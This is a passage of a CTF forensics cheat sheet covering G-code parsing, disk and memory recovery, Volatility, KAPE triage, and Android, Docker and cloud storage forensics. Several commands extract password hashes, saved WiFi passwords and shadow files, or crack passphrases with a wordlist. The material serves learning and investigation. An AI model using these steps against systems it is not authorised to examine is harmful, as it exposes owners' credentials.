**ROT18:** ROT13 on letters + ROT5 on digits. Common final layer in multi-stage forensics. See [linux-forensics.md](linux-forensics.md) for implementation.


---


# 3d-printing

# CTF Forensics - 3D Printing / CAD File Forensics

## Table of Contents
- [PrusaSlicer Binary G-code (.g / .bgcode)](#prusaslicer-binary-g-code-g--bgcode)
- [QOIF (Quite OK Image Format)](#qoif-quite-ok-image-format)
- [G-code Analysis Tips](#g-code-analysis-tips)
- [G-code Side View Visualization (0xFun 2026)](#g-code-side-view-visualization-0xfun-2026)
- [Uncommon File Magic Bytes](#uncommon-file-magic-bytes)

---

## PrusaSlicer Binary G-code (.g / .bgcode)

**File magic:** `GCDE` (4 bytes)

The `.g` extension is PrusaSlicer's binary G-code format (bgcode). It stores G-code in a block-based structure with compression.

**File structure:**
```text
Header: "GCDE"(4) + version(4) + checksum_type(2)
Blocks: [type(2) + compression(2) + uncompressed_size(4)
         + compressed_size(4) if compressed
         + type-specific fields
         + data + CRC32(4)]
```

**Block types:**
- 0 = FileMetadata (has encoding field, 2 bytes)
- 1 = GCode (has encoding field, 2 bytes)
- 2 = SlicerMetadata (has encoding field, 2 bytes)
- 3 = PrinterMetadata (has encoding field, 2 bytes)
- 4 = PrintMetadata (has encoding field, 2 bytes)
- 5 = Thumbnail (has format(2) + width(2) + height(2))

**Compression types:** 0=None, 1=Deflate, 2=Heatshrink(11,4), 3=Heatshrink(12,4)

**Thumbnail formats:** 0=PNG, 1=JPEG, 2=QOI (Quite OK Image)

**Parsing and extracting G-code:**
```python
import struct, zlib
import heatshrink2  # pip install heatshrink2

with open('file.g', 'rb') as f:
    data = f.read()

pos = 10  # After header
while pos < len(data) - 8:
    block_type = struct.unpack('<H', data[pos:pos+2])[0]
    compression = struct.unpack('<H', data[pos+2:pos+4])[0]
    uncompressed_size = struct.unpack('<I', data[pos+4:pos+8])[0]
    pos += 8
    if compression != 0:
        compressed_size = struct.unpack('<I', data[pos:pos+4])[0]
        pos += 4
    else:
        compressed_size = uncompressed_size
    # Type-specific extra header fields
    if block_type in [0,1,2,3,4]:
        pos += 2  # encoding field
    elif block_type == 5:
        pos += 6  # format + width + height
    block_data = data[pos:pos+compressed_size]
    pos += compressed_size + 4  # data + CRC32

    if block_type == 1:  # GCode block
        if compression == 3:  # Heatshrink 12/4
            gcode = heatshrink2.decompress(block_data, window_sz2=12, lookahead_sz2=4)
        elif compression == 1:  # Deflate (zlib)
            gcode = zlib.decompress(block_data)
        # Search gcode for hidden comments/flags
```

**Common hiding spots:**
- G-code comments (`;=== FLAG_CHAR ... ===`) at specific layer heights
- Custom G-code sections (`;TYPE:Custom`)
- Metadata fields (object names, filament info)
- Thumbnail images (extract and view QOIF/PNG)

## QOIF (Quite OK Image Format)

**Magic:** `qoif` (4 bytes) + width(4 BE) + height(4 BE) + channels(1) + colorspace(1)

Lightweight image format used in PrusaSlicer thumbnails. Decode with Python struct or use the `qoi` library.

## G-code Analysis Tips

```bash
# Search for flag patterns in decompressed gcode
grep -i "flag\|meta\|ctf\|secret" output.gcode

# Look for custom comments at layer changes
grep ";.*FLAG\|;.*LAYER_CHANGE" output.gcode

# Extract XY coordinates for visual patterns
grep "^G1" output.gcode | awk '{print $2, $3}' > coords.txt
```

## G-code Side View Visualization (0xFun 2026)

**Pattern (PrintedParts):** Plot X vs Z (side view) with Y filtering. Extrusion segments at specific Y ranges form readable text.

```bash
# Extract XY coordinates from G-code
grep "^G1" output.gcode | awk '{print $2, $3}' > coords.txt
# Plot with matplotlib for visual patterns
```

**Lesson:** G-code is just coordinate lists. Side projections (XZ or YZ) reveal embossed/engraved text.

---

## Uncommon File Magic Bytes

| Magic | Format | Extension | Notes |
|-------|--------|-----------|-------|
| `GCDE` | PrusaSlicer binary G-code | `.g`, `.bgcode` | 3D printing, heatshrink compressed |
| `qoif` | Quite OK Image Format | `.qoi` | Lightweight image format, often embedded |
| `OggS` | Ogg container | `.ogg` | Audio/video |
| `RIFF` | RIFF container | `.wav`,`.avi` | Check subformat |
| `%PDF` | PDF | `.pdf` | Check metadata & embedded objects |


# disk-advanced

# CTF Forensics - Advanced Disk and Memory Techniques

## Table of Contents
- [Deleted Partition Recovery](#deleted-partition-recovery)
- [ZFS Forensics (Nullcon 2026)](#zfs-forensics-nullcon-2026)
- [GPT Partition GUID Data Encoding (VuwCTF 2025)](#gpt-partition-guid-data-encoding-vuwctf-2025)
- [Windows Minidump String Carving (0xFun 2026)](#windows-minidump-string-carving-0xfun-2026)
- [VMDK Sparse Parsing (0xFun 2026)](#vmdk-sparse-parsing-0xfun-2026)
- [Memory Dump String Carving (Pragyan 2026)](#memory-dump-string-carving-pragyan-2026)
- [Memory Dump Malware Extraction + XOR (VuwCTF 2025)](#memory-dump-malware-extraction--xor-vuwctf-2025)
- [Linux Ransomware Memory-Key Recovery (MetaCTF 2026)](#linux-ransomware-memory-key-recovery-metactf-2026)
- [WordPerfect Macro XOR Extraction (srdnlenCTF 2026)](#wordperfect-macro-xor-extraction-srdnlenctf-2026)
- [Minidump ISO 9660 Recovery + XOR Key (srdnlenCTF 2026)](#minidump-iso-9660-recovery--xor-key-srdnlenctf-2026)
- [APFS Snapshot Historical File Recovery (srdnlenCTF 2026)](#apfs-snapshot-historical-file-recovery-srdnlenctf-2026)
- [RAID 5 Disk Recovery via XOR (Crypto-Cat)](#raid-5-disk-recovery-via-xor-crypto-cat)
- [HFS+ Resource Fork Hidden Binary Recovery (CONFidence CTF 2017)](#hfs-resource-fork-hidden-binary-recovery-confidence-ctf-2017)
- [SQLite Edit History Reconstruction from Diff Table (Google CTF 2017)](#sqlite-edit-history-reconstruction-from-diff-table-google-ctf-2017)
- [See Also](#see-also)

---

## Deleted Partition Recovery

**Pattern (Till Delete Do Us Part):** USB image with deleted partition table.

**Recovery workflow:**
```bash
# Check for partitions
fdisk -l image.img              # Shows no partitions

# Recover partition table
testdisk image.img              # Interactive recovery

# Or use kpartx to map partitions
kpartx -av image.img            # Maps as /dev/mapper/loop0p1

# Mount recovered partition
mount /dev/mapper/loop0p1 /mnt/evidence

# Check for hidden directories
ls -la /mnt/evidence            # Look for .dotfolders
find /mnt/evidence -name ".*"   # Find hidden files
```

**Flag hiding:** Path components as flag chars (e.g., `/.Meta/CTF/{f/l/a/g}`)

---

## ZFS Forensics (Nullcon 2026)

**Pattern:** Corrupted ZFS pool image with encrypted dataset.

**Recovery workflow:**
1. **Label reconstruction:** All 4 ZFS labels may be zeroed. Find packed nvlist data elsewhere in the image using `strings` + offset searching.
2. **MOS object repair:** Copy known-good nvlist bytes to block locations, recompute Fletcher4 checksums:
```python
def fletcher4(data):
    a = b = c = d = 0
    for i in range(0, len(data), 4):
        a = (a + int.from_bytes(data[i:i+4], 'little')) & 0xffffffff
        b = (b + a) & 0xffffffff
        c = (c + b) & 0xffffffff
        d = (d + c) & 0xffffffff
    return (d << 96) | (c << 64) | (b << 32) | a
```
3. **Encryption cracking:** Extract PBKDF2 parameters (iterations, salt) from ZAP objects. GPU-accelerate with PyOpenCL for PBKDF2-HMAC-SHA1, verify AES-256-GCM unwrap on CPU.
4. **Passphrase list:** rockyou.txt or similar. GPU rate: ~24k passwords/sec.

---

## GPT Partition GUID Data Encoding (VuwCTF 2025)

**Pattern (Undercut):** "LLMs only" + "undercut" → not AI GPT, but GUID Partition Table.

**Key insight:** GPT partition GUIDs are 16 arbitrary bytes — can encode anything. Look for file magic headers in GUIDs.

```bash
# Parse GPT partition table
gdisk -l image.img
# Or with Python:
python3 -c "
import struct
data = open('image.img','rb').read()
# GPT header at LBA 1 (offset 512)
# Partition entries start at LBA 2 (offset 1024)
# Each entry is 128 bytes, GUID at offset 16 (16 bytes)
for i in range(128):
    entry = data[1024 + i*128 : 1024 + (i+1)*128]
    guid = entry[16:32]
    if guid != b'\x00'*16:
        print(f'Partition {i}: {guid.hex()}')
"
```

**First GUID starts with `BZh11AY&SY`** (bzip2 magic) → concatenate GUIDs, decompress as bzip2, then decode ASCII85.

---

## Windows Minidump String Carving (0xFun 2026)

**Pattern (kd):** Go binary crash dump. Flag as plaintext string constant in .data section survives in minidump memory.

```bash
strings -a minidump.dmp | grep -i "flag\|ctf\|0xFUN"
```

**Lesson:** Minidumps contain full memory regions. String constants, keys, and secrets persist. `strings -a` + `grep` is the fast path.

---

## VMDK Sparse Parsing (0xFun 2026)

**Pattern (VMware):** Split sparse VMDK requires grain directory + grain table traversal.

**Key steps:**
1. Parse VMDK sparse header (grain size, GD offset, GT coverage)
2. Follow grain directory → grain table → data grains
3. Calculate absolute disk offsets across split files
4. Mount extracted filesystem (ext4, NTFS)

**Lesson:** Don't assume VM images can be mounted directly. Parse the VMDK sparse format manually.

---

## Memory Dump String Carving (Pragyan 2026)

**Pattern (c47chm31fy0uc4n):** Linux memory dump with flag in environment variables or process data.

```bash
strings -a -n 6 memdump.bin | grep -E "SYNC|FLAG|SSH_CLIENT|SESSION_KEY"
# SSH artifacts reveal source IP and ephemeral port
# Environment variables may contain keys/tokens
```

---

## Memory Dump Malware Extraction + XOR (VuwCTF 2025)

**Pattern (Jellycat):** Extract fake executable from Windows memory dump. Cipher: subtract 0x32, then XOR with cycling key (large multi-line string, e.g., ASCII art).

**Key lesson:** Always extract and reverse the actual binary from memory rather than trusting `strings` output (string tables may be red herrings). XOR keys can be hundreds of bytes (ASCII art, lorem ipsum).

```python
# Extract binary, find XOR key in data section
key = b"..."  # Large ASCII art string
cipher = open('extracted.bin', 'rb').read()
plaintext = bytes((b - 0x32) ^ key[i % len(key)] for i, b in enumerate(cipher))
```

---

## Linux Ransomware Memory-Key Recovery (MetaCTF 2026)

**Pattern:** Linux memory dump + encrypted `.veg` files + `enc_key.bin`; ransomware uses hybrid crypto (AES for files, RSA-wrapped key). Volatility may fail process enumeration due symbol/KASLR (Kernel Address Space Layout Randomization) mismatch.

**Fast workflow:**
1. **Confirm archive integrity before analysis.**
```bash
unzip -l encrypted_files.zip
# Compare listed files/sizes vs extracted tree; re-extract cleanly if mismatch
unzip -o encrypted_files.zip -d encrypted_full
```

2. **Reverse ransomware binary quickly to identify mode/layout.**
```bash
strings -a ransomware.elf | grep -E "enc_key|EVP_aes|PUBLIC KEY|.veg"
objdump -d ransomware.elf | less
```
- Typical finding: `AES-256-OFB`, IV prepended to each `.veg`, global 32-byte AES key, RSA public key hardcoded.

3. **Try Volatility normally, then pivot immediately if empty/unstable.**
```bash
vol -f memdump.raw linux.pslist
vol -f memdump.raw linux.proc.Maps
vol -f memdump.raw linux.vmayarascan
```
- If Linux plugins return empty/invalid output despite correct banner/symbols, do **raw-memory candidate scanning**.

4. **Recover AES key via anchored candidate scan + magic validation.**
- Use recurring anchor strings in memory (e.g., `/home/.../enc_key.bin`, HOME path).
- Derive candidate offsets near anchors (page-aligned windows).
- Test each 32-byte candidate by decrypting first blocks of multiple `.veg` files and checking magic bytes (`%PDF-`, `PK\x03\x04`, `\x89PNG\r\n\x1a\n`).
- Keep candidates that satisfy multiple independent signatures.

5. **Decrypt full dataset and verify output completeness.**
```bash
# OFB: iv = first 16 bytes, ciphertext starts at +16
# Decrypt all *.veg recursively from a clean extraction directory
```
- Validate recovered file count against zip listing.
- Watch for duplicated mirror trees (e.g., `snap/*/Downloads/...`) and deduplicate logically.

6. **Defend against false flags.**
- Treat metadata-only flags as suspicious until corroborated by challenge context.
- Prefer tokens from primary project artifacts and perform uniqueness checks:
```bash
rg -n -a '[A-Za-z]+CTF\\{[^}]+\\}' recovered_full
pdftotext recovered_full/**/*.pdf - 2>/dev/null | rg '[A-Za-z]+CTF\\{'
```

**Key lessons:**
- Don't trust a partial/stale extraction tree; re-extract zip cleanly.
- In OFB ransomware, magic-byte validation is a fast key oracle.
- A plausible `CTF{...}` in metadata can be a decoy; confirm with corpus-wide consistency.

---

## WordPerfect Macro XOR Extraction (srdnlenCTF 2026)

**Pattern (Trilogy of Death Vol I: Corel):** Corel Linux disk image containing WordPerfect macro file (fc.wcm) with XOR-encrypted byte arrays.

**Key insight:** WordPerfect macro files (`.wcm`) can contain executable macros with embedded encrypted data. The XOR formula `(bb + kb) - 2*(bb & kb)` is mathematically equivalent to bitwise XOR.

**Brute-force 4-byte XOR key under charset constraints:**
```python
import string

docbody = [206, 56, 8, 128, 209, 47, 2, 149, ...]  # encrypted bytes from macro
allowed = set(map(ord, string.ascii_lowercase + string.digits + "_{}"))

# Find valid key bytes independently for each position mod 4
cands = []
for j in range(4):
    good = []
    for k in range(256):
        if all((docbody[i] ^ k) in allowed for i in range(j, len(docbody), 4)):
            good.append(k)
    cands.append(good)

# Try all combinations (usually very few candidates per position)
for k0 in cands[0]:
    for k1 in cands[1]:
        for k2 in cands[2]:
            for k3 in cands[3]:
                key = [k0, k1, k2, k3]
                pt = ''.join(chr(c ^ key[i % 4]) for i, c in enumerate(docbody))
                if pt.startswith("srd") and pt.endswith("}"):
                    print(pt)
```

**Lesson:** Legacy document formats (WordPerfect, Lotus 1-2-3) can embed executable macros with obfuscated data. When you know the flag charset, brute-forcing a short XOR key is trivial by filtering each key byte independently.

---

## Minidump ISO 9660 Recovery + XOR Key (srdnlenCTF 2026)

**Pattern (Trilogy of Death Vol II: The Legendary Armory):** Two relics in volatile memory (minidump) must be XORed; ISO 9660 directory entries in memory fragments point to hidden data.

**Technique:**
1. Search minidump for ISO 9660 directory entry signatures
2. Parse directory entries to locate target file offset and size
3. Decrypt file using recovered XOR key (e.g., 8-byte repeating key)
4. Parse resulting data as ZIP without central directory (local headers only)

**ZIP local header parsing without central directory:**
```python
import struct, zlib

pos = 0
files = {}
while True:
    off = dec.find(b"PK\x03\x04", pos)
    if off < 0:
        break
    (ver, flag, method, _, _, crc, csize, usize, nlen, xlen) = struct.unpack_from(
        "<HHHHHIIIHH", dec, off + 4)
    name = dec[off + 30:off + 30 + nlen].decode()
    data_off = off + 30 + nlen + xlen
    comp = dec[data_off:data_off + csize]
    if method == 8:  # Deflate
        raw = zlib.decompress(comp, -15)
    else:
        raw = comp
    files[name] = raw
    pos = data_off + csize
```

**Key insight:** When ZIP central directory is missing/corrupt, iterate local file headers (`PK\x03\x04`) directly. Each local header contains enough metadata (compression method, sizes, filename) to extract files independently.

---

## APFS Snapshot Historical File Recovery (srdnlenCTF 2026)

**Pattern (Trilogy of Death Vol III: The Poisoned Apple):** APFS volume maintains historical snapshots; recovering earlier state of a key file reveals authentic value before poisoning.

**Technique:**
1. Extract APFS partition from DMG (locate by sector offset)
2. Search for APFS volume superblocks (magic `APSB`) across all snapshots, noting transaction IDs (XIDs)
3. Use `icat` (Sleuth Kit with APFS support) to read specific inodes across different snapshot XIDs
4. Compare file content across XID boundaries to identify when poisoning occurred
5. Use pre-poisoning value for decryption

**Finding APFS volume superblocks across snapshots:**
```python
import struct

with open("apfs_partition.img", "rb") as f:
    mm = f.read()

snaps = []
pos = 0
while True:
    idx = mm.find(b"APSB", pos)
    if idx < 0:
        break
    # XID is at offset -16 from magic (in block header)
    hdr_start = idx - 32
    xid = struct.unpack_from("<Q", mm, hdr_start + 16)[0]
    blk = hdr_start // 4096
    snaps.append((xid, blk))
    pos = idx + 1

# Read target inode across snapshots
import subprocess
for xid, blk in sorted(set(snaps)):
    try:
        out = subprocess.check_output(
            ["icat", "-f", "apfs", "-P", "apfs", "-B", str(blk),
             "apfs_partition.img", "449414"])  # target inode number
        print(f"XID {xid}: {out[:64]}...")
    except:
        pass
```

**Decryption with recovered authentic key:**
```python
import hashlib
from Cryptodome.Cipher import AES

# Pre-poisoning key value (found in earlier snapshot)
authentic_key_hex = "39f520679fd68654500f9cd44e8caed2bc897a3227dc297c4520336de2a59dd7"
key = hashlib.pbkdf2_hmac('sha256', bytes.fromhex(authentic_key_hex), salt, iterations)
cipher = AES.new(key, AES.MODE_CBC, iv)
plaintext = cipher.decrypt(encrypted_flag)
```

**Key insight:** APFS (and other copy-on-write filesystems like ZFS/Btrfs) preserve historical file states in snapshots. When a challenge involves "poisoned" or "tampered" data, always check for older snapshots containing the original values. Use `icat` with different block offsets to read the same inode across different transaction IDs.

---

## RAID 5 Disk Recovery via XOR (Crypto-Cat)

**Pattern:** RAID 5 array with one damaged/missing disk. Two working disks are provided and the third must be reconstructed using XOR parity.

**How RAID 5 parity works:** Data is striped across N disks with distributed parity. For any stripe, `Disk1 XOR Disk2 XOR ... XOR DiskN = 0`. If one disk is missing, XOR the remaining disks to recover it.

**Recovery script:**
```python
# Recover missing disk2 from disk1 and disk3
with open('disk1.img', 'rb') as f:
    disk1 = f.read()
with open('disk3.img', 'rb') as f:
    disk3 = f.read()

# XOR byte-by-byte to recover the missing disk
disk2 = bytes(a ^ b for a, b in zip(disk1, disk3))

with open('disk2.img', 'wb') as f:
    f.write(disk2)
```

**After recovery:**
```bash
# Reassemble the RAID array
mdadm --create /dev/md0 --level=5 --raid-devices=3 \
  disk1.img disk2.img disk3.img

# Or mount individual recovered disk if it contains a filesystem
mount -o loop,ro disk2.img /mnt/recovered
```

**Key insight:** RAID 5 uses XOR parity across all disks in each stripe. XOR is self-inverse: if `A XOR B XOR C = 0`, then `B = A XOR C`. For N-disk RAID 5, XOR all N-1 working disks together to recover the missing one.

**Detection:** Challenge provides multiple disk images of identical size, mentions "array", "redundancy", or "parity". `file` command may identify them as filesystem images or raw data.

---

## HFS+ Resource Fork Hidden Binary Recovery (CONFidence CTF 2017)

HFS+ files can have a Resource Fork containing hidden data invisible to most tools. Use HFSExplorer to inspect the catalog and 010 Editor with HFS template to extract.

```bash
# 1. Mount or open the HFS+ image
# Standard tools miss Resource Forks:
binwalk image.dmg    # Won't find resource fork contents
strings image.dmg    # May show fragments

# 2. Use HFSExplorer to browse the catalog
# Look for files with non-zero Resource Fork size
# Suspicious: nodeID 1337 or similar CTF-typical IDs

# 3. Check .fseventsd logs for historical file operations
pip install FSEventsParser
python FSEventsParser.py -s image.dmg -o events.csv
# Reveals creation/deletion of files across the volume

# 4. Extract Resource Fork data with 010 Editor:
# - Load disk image with HFS+ template
# - Navigate to catalog -> target file -> resource fork extents
# - Note start block and length from extent records
# - If split across multiple extents, extract and concatenate:
dd if=image.dmg bs=4096 skip=$BLOCK1 count=$LEN1 of=part1.bin
dd if=image.dmg bs=4096 skip=$BLOCK2 count=$LEN2 of=part2.bin
cat part1.bin part2.bin > recovered_binary
```

**Key insight:** HFS+ Resource Forks are a second data stream attached to files, invisible to most forensic tools that only examine the Data Fork. `binwalk`, `foremost`, and `strings` miss them. HFSExplorer shows both forks in the catalog; 010 Editor with the HFS template reveals extent records for manual extraction. `.fseventsd` logs can reveal that hidden files were created/deleted.

**Detection:** DMG or HFS+ disk image where standard carving finds nothing. `file` identifies as "Apple HFS+" or "Apple Partition Map". Challenge mentions "Mac", "Apple", or "hidden data".

---

## SQLite Edit History Reconstruction from Diff Table (Google CTF 2017)

SQLite databases storing note/document edit history as diff entries (operation, position, text, diffset) can be replayed to reconstruct content at any point in time.

```python
import sqlite3

db = sqlite3.connect('notes.db')
# Table structure: diffs(id, type, position, text, diffset)
# type: 'insert' or 'remove'
diffs = db.execute("SELECT type, position, text FROM diffs ORDER BY id").fetchall()

document = ""
for op_type, position, text in diffs:
    if op_type == 'insert':
        document = document[:position] + text + document[position:]
    elif op_type == 'remove':
        document = document[:position] + document[position + len(text):]
    # Check for flag at each step (may have been typed then deleted)
    if 'CTF{' in document or 'flag{' in document:
        print(f"Flag found: {document}")
```

**Key insight:** Collaborative editing tools store incremental diffs. Replaying all operations sequentially reveals content that existed at any point in the edit history, including secrets that were later deleted. Check for flags at every intermediate state, not just the final document.

**Detection:** SQLite database with tables containing `type`/`operation`, `position`, `text` columns. Challenge mentions "notes", "editor", "collaboration", or "history". Schema inspection via `.schema` or `sqlite3 db.sqlite ".tables"` reveals diff-style tables.

---

## See Also

- [disk-and-memory.md](disk-and-memory.md) - Core disk and memory forensics (Volatility 3, disk image analysis, VM/OVA/VMDK forensics, VMware snapshots, coredump analysis, Windows KAPE triage, PowerShell ransomware, Android forensics, Docker container forensics, cloud storage forensics, BSON reconstruction, TrueCrypt/VeraCrypt mounting)
- [disk-recovery.md](disk-recovery.md) - Disk recovery and extraction patterns (LUKS master key recovery, PRNG timestamp seed brute-force, VBA macro binary recovery, FemtoZip decompression, XFS reconstruction, tar duplicate entry extraction, nested matryoshka filesystem extraction, anti-carving via null byte interleaving)


# disk-and-memory

# CTF Forensics - Disk and Memory Analysis

## Table of Contents
- [Memory Forensics (Volatility 3)](#memory-forensics-volatility-3)
- [Disk Image Analysis](#disk-image-analysis)
- [VM Forensics (OVA/VMDK)](#vm-forensics-ovavmdk)
- [VMware Snapshot Forensics](#vmware-snapshot-forensics)
- [Coredump Analysis](#coredump-analysis)
- [Windows KAPE Triage Analysis (UTCTF 2026)](#windows-kape-triage-analysis-utctf-2026)
- [PowerShell Ransomware Analysis](#powershell-ransomware-analysis)
- [Android Forensics](#android-forensics)
- [Container Forensics (Docker)](#container-forensics-docker)
- [Cloud Storage Forensics (AWS S3 / GCP / Azure)](#cloud-storage-forensics-aws-s3--gcp--azure)
- [BSON (Binary JSON) Format Reconstruction (IceCTF 2016)](#bson-binary-json-format-reconstruction-icectf-2016)
- [TrueCrypt / VeraCrypt Volume Mounting (GreHack CTF 2016)](#truecrypt--veracrypt-volume-mounting-grehack-ctf-2016)
- [See Also](#see-also)

---

## Memory Forensics (Volatility 3)

```bash
vol3 -f memory.dmp windows.info
vol3 -f memory.dmp windows.pslist
vol3 -f memory.dmp windows.cmdline
vol3 -f memory.dmp windows.netscan
vol3 -f memory.dmp windows.filescan
vol3 -f memory.dmp windows.dumpfiles --physaddr <addr>
vol3 -f memory.dmp windows.mftscan | grep flag
```

**Common plugins:**
- `windows.pslist` / `windows.pstree` - Process listing
- `windows.cmdline` - Command line arguments
- `windows.netscan` - Network connections
- `windows.filescan` - File objects in memory
- `windows.dumpfiles` - Extract files by physical address
- `windows.mftscan` - MFT FILE objects in memory (timestamps, filenames). Note: `mftparser` was Volatility 2 only; Vol3 uses `mftscan`

---

## Disk Image Analysis

```bash
# Mount read-only
sudo mount -o loop,ro image.dd /mnt/evidence

# Autopsy / Sleuth Kit
fls -r image.dd              # List files recursively
icat image.dd <inode>        # Extract file by inode

# Carving deleted files
photorec image.dd
foremost -i image.dd
```

---

## VM Forensics (OVA/VMDK)

```bash
# OVA = TAR archive containing VMDK + OVF
tar -xvf machine.ova

# 7z reads VMDK directly (no mount needed)
7z l disk.vmdk | head -100
7z x disk.vmdk -oextracted "Windows/System32/config/SAM" -r
```

**Key files to extract from VM images:**
- `Windows/System32/config/SAM` - Password hashes
- `Windows/System32/config/SYSTEM` - Boot key
- `Windows/System32/config/SOFTWARE` - Installed software
- `Users/*/NTUSER.DAT` - User registry
- `Users/*/AppData/` - Browser data, credentials

---

## VMware Snapshot Forensics

**Converting VMware snapshots to memory dumps:**
```bash
# .vmss (suspended state) + .vmem (memory) → memory.dmp
vmss2core -W path/to/snapshot.vmss path/to/snapshot.vmem
# Output: memory.dmp (analyzable with Volatility/MemprocFS)
```

**Malware hunting in snapshots (Armorless):**
1. Check Amcache for executed binaries near encryption timestamp
2. Look for deceptive names (Unicode lookalikes: `ṙ` instead of `r`)
3. Dump suspicious executables from memory
4. If PyInstaller-packed: `pyinstxtractor` → decompile `.pyc`
5. If PyArmor-protected: use PyArmor-Unpacker

**Ransomware key recovery via MFT:**
- Even if original files deleted, MFT preserves modification timestamps
- Seed-based encryption: recover mtime → derive key
```bash
vol3 -f memory.dmp windows.mftscan | grep flag
# mtime as Unix epoch → seed for PRNG → derive encryption key
```

---

## Coredump Analysis

```bash
gdb -c core.dump
(gdb) info registers
(gdb) x/100x $rsp
(gdb) find 0x0, 0xffffffff, "flag"
```

---

## Windows KAPE Triage Analysis (UTCTF 2026)

**Pattern (Landfall, Sherlockk, Cold Workspace):** KAPE (Kroll Artifact Parser and Extractor) triage collection ZIP containing Windows forensic artifacts. Multiple challenges reference the same triage dataset.

**KAPE triage structure:**
```text
Modified_KAPE_Triage_Files/
├── C/
│   ├── Users/<username>/
│   │   ├── AppData/Local/Microsoft/Windows/PowerShell/PSReadLine/
│   │   │   └── ConsoleHost_history.txt    # PowerShell command history
│   │   ├── NTUSER.DAT                     # User registry hive
│   │   └── AppData/Roaming/Microsoft/Windows/Recent/  # Recent files
│   ├── Windows/
│   │   ├── System32/config/
│   │   │   ├── SAM          # Password hashes
│   │   │   ├── SYSTEM       # System config + boot key
│   │   │   └── SOFTWARE     # Installed software
│   │   └── appcompat/Programs/
│   │       └── Amcache.hve  # Execution history with SHA-1 hashes
│   └── $MFT                 # Master File Table
└── ...
```

**High-value artifacts:**

1. **PowerShell history** — reveals attacker commands:
```bash
cat "C/Users/*/AppData/Local/Microsoft/Windows/PowerShell/PSReadLine/ConsoleHost_history.txt"
# Look for: credential access, lateral movement, data staging
```

2. **Amcache** — executed programs with timestamps and hashes:
```bash
# Parse with Eric Zimmerman's AmcacheParser or regipy
python3 -c "
from regipy.registry import RegistryHive
reg = RegistryHive('C/Windows/appcompat/Programs/Amcache.hve')
for entry in reg.recurse_subkeys(as_json=True):
    print(entry)
" | grep -i "flag\|suspicious\|malware"
```

3. **MFT resident data** — small files stored directly in MFT records:
```python
# Parse MFT for resident file data (files < ~700 bytes stored inline)
# Use analyzeMFT or python-ntfs
import struct

with open('$MFT', 'rb') as f:
    mft_data = f.read()

# Search for flag patterns in raw MFT data
import re
flags = re.findall(rb'utflag\{[^}]+\}', mft_data)
for flag in flags:
    print(f"Found: {flag.decode()}")
```

4. **Environment variables from memory dumps** (Cold Workspace pattern):
```bash
# Small .dmp files may be minidumps with environment variable blocks
strings -a cold-workspace.dmp | grep -i "flag\|password\|key\|secret"
# Environment variables survive in process memory snapshots
```

**Challenge patterns from UTCTF 2026:**
- **Landfall:** Flag hidden in PowerShell history or Amcache execution records
- **Sherlockk:** Correlate Amcache entries with MFT timestamps to identify malicious activity
- **Cold Workspace:** Flag in environment variables extracted from memory dump
- **Checkpoint A/B:** Multi-part investigation using combined artifacts

**Key insight:** KAPE triage ZIPs contain pre-collected forensic artifacts — no need for full disk imaging. Start with PowerShell history (fastest wins) → Amcache (execution timeline) → MFT (resident data for small files) → registry hives (persistence, credentials).

---

## PowerShell Ransomware Analysis

**Pattern (Email From Krampus):** PowerShell memory dump + network capture.

**Analysis workflow:**
1. Extract script blocks from minidump:
```bash
python power_dump.py powershell.DMP
# Or: strings powershell.DMP | grep -A5 "function\|Invoke-"
```

2. Identify encryption (typically AES-CBC with SHA-256 key derivation)

3. Extract encrypted attachment from PCAP:
```bash
# Filter SMTP traffic in Wireshark
# Export attachment, base64 decode
```

4. Find encryption key in memory dump:
```bash
# Key often generated with Get-Random, regex search:
strings powershell.DMP | grep -E '^[A-Za-z0-9]{24}$' | sort | head
```

5. Find archive password similarly, decrypt layers

---

## Android Forensics

```bash
# Extract APK from device
adb pull /data/app/com.target.app/base.apk

# Analyze APK contents
apktool d base.apk -o decompiled/
# Check: AndroidManifest.xml, res/values/strings.xml, shared_prefs/

# Extract data from Android backup
adb backup -apk -shared -all -f backup.ab
java -jar abe.jar unpack backup.ab backup.tar
tar xf backup.tar

# SQLite databases (contacts, messages, browser history)
sqlite3 /data/data/com.android.providers.contacts/databases/contacts2.db ".tables"
sqlite3 /data/data/com.android.providers.telephony/databases/mmssms.db "SELECT * FROM sms"

# Parse Android filesystem image
mkdir android_mount && mount -o ro android_image.img android_mount/
# Key locations:
# /data/data/<app>/databases/     — app SQLite databases
# /data/data/<app>/shared_prefs/  — app preferences (XML)
# /data/system/packages.xml       — installed packages
# /data/misc/wifi/wpa_supplicant.conf — saved WiFi passwords
```

**Key insight:** Android stores app data in `/data/data/<package>/` with SQLite databases and XML shared preferences. `adb backup` captures the full app state. For CTFs, check `shared_prefs/` for hardcoded secrets and `databases/` for flags.

---

## Container Forensics (Docker)

```bash
# Export Docker image layers
docker save IMAGE:TAG -o image.tar
tar xf image.tar
# Each layer is a directory with layer.tar containing filesystem changes
# Check: layer.tar files for added/modified files, deleted files (.wh.* whiteout)

# Inspect image history for build commands (may contain secrets)
docker history IMAGE:TAG --no-trunc
# Shows every Dockerfile instruction including ARGs and ENV values

# Extract filesystem without running the container
docker create --name extract IMAGE:TAG
docker export extract -o container_fs.tar
docker rm extract

# Analyze with dive (layer-by-layer diff viewer)
dive IMAGE:TAG

# Common forensic targets in container images:
# /app/.env, /app/config/* — application secrets
# /root/.bash_history     — build-time commands
# /etc/shadow             — leaked credentials
# Deleted files visible in earlier layers even if removed in later ones
```

**Key insight:** Docker images are layered — a file deleted in a later layer still exists in the earlier layer's tar. Use `docker history --no-trunc` to see full Dockerfile commands including secrets passed via `ARG` or `ENV`. The `dive` tool visualizes layer diffs interactively.

---

## Cloud Storage Forensics (AWS S3 / GCP / Azure)

```bash
# Enumerate public S3 buckets
aws s3 ls s3://target-bucket/ --no-sign-request
aws s3 cp s3://target-bucket/flag.txt . --no-sign-request

# Check bucket versioning (previous versions may contain deleted flags)
aws s3api list-object-versions --bucket target-bucket --no-sign-request
aws s3api get-object --bucket target-bucket --key secret.txt --version-id VERSION_ID out.txt

# GCP Cloud Storage
gsutil ls gs://target-bucket/
gsutil cp gs://target-bucket/flag.txt .

# Azure Blob Storage
az storage blob list --container-name target --account-name storageaccount
az storage blob download --container-name target --name flag.txt --account-name storageaccount
```

**Key insight:** Cloud storage versioning preserves deleted objects. Even if a flag file is deleted from the bucket, previous versions may still be accessible via `list-object-versions`. Always check for versioning-enabled buckets.

---

## BSON (Binary JSON) Format Reconstruction (IceCTF 2016)

BSON is MongoDB's binary serialization format. Corrupted BSON files need header repair before parsing, and may contain base64-encoded file fragments.

```python
import bson

# BSON header: first 4 bytes = little-endian document size
# Fix corrupted header by setting correct size
